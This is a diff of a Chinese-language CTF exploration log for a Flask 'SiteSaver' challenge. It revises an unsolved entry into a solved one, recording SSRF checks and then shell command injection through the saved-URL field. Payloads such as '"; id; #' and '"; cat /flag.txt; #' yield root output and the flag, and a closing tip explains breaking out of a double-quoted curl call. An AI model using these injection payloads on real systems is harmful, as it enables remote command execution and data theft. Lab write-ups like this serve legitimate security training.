@@ -1,17 +1,43 @@
-# xben-094-24 · 探索记录（未解）
+# xben-094-24 · 探索记录
 
-对应题解：暂无（本题未拿到 flag）
+对应题解：[`xben-094-24.md`](./xben-094-24.md)
 
-## 结论
+## 目标与起点
 
-SiteSaver（Flask）。`/add_url` 收 `url` 后回 `Error in saving URL..`，任何 URL（含 `file:///FLAG.txt`、`http://127.0.0.1/`、`http://example.com`）都失败；未发现读取已保存站点内容的接口。未拿到 flag。
+`10.0.172.218:5003`，SiteSaver：`/`（列表）、`/add_url`（表单）、`POST /delete_url/<n>`。
 
-## 尝试过程
+## 第一阶段：SSRF 与状态检查
 
-- `/` 列出已保存站点（初始 4 条，`/delete_url/<n>` 可删）。
-- `POST /add_url url=...` → `{"message":"Error in saving URL..","success":false}`；`example.com` 那次直接超时。
-- `/add_url` 是表单 + jQuery AJAX，无 CSRF。
+| url | 结果 |
+| --- | --- |
+| `http://127.0.0.1:5003/` | `returned 200 status, Saved successfully` |
+| `http://127.0.0.1:5003/flag.txt` | `Error in saving URL..`（404） |
+| `http://example.com` | `Error in saving URL..`（出网失败/超时） |
 
-## 说明
+判据：检查的是 HTTP 状态码，不是字符串格式。
 
-本文件只记录实际做过的请求与判据；没有验证过的猜想不写进结论。
+## 第二阶段：读首页预置数据
+
+列表里有 `http://example.com"; cat flag.txt #` —— 双引号 + `;` + `#`，
+典型的「URL 被塞进双引号 shell 命令」形状。
+
+## 第三阶段：验证与利用
+
+| url | 结果 |
+| --- | --- |
+| `http://127.0.0.1:5003/"; sleep 4; #` | 4.2 s（对照 0.09 s） |
+| `http://127.0.0.1:5003/"; id; #` | `returned 200uid=0(root) gid=0(root)...status` |
+| `http://127.0.0.1:5003/"; cat /flag.txt; #` | **flag** |
+
+## 走不通 / 走过的弯路（留档）
+
+| 方向 | 结果 | 判据 |
+| --- | --- | --- |
+| `http://...;id;#`（不带双引号） | 0.09s，报 Error | 没有跳出引号，整串被当成 URL |
+| `POST /delete_url/1 OR 1=1` | 404 | 路由只接受 int |
+| 目录扫描 | 只有 `add_url` | 其余 404 |
+
+## 这次真正的收获
+
+1. 「状态检查」类功能经常是 `curl "..."`，双引号上下文要用 `"` 跳出。
+2. 首页/预置记录里出现奇怪字符串时，按它的形状直接复现，通常就是出题意图。
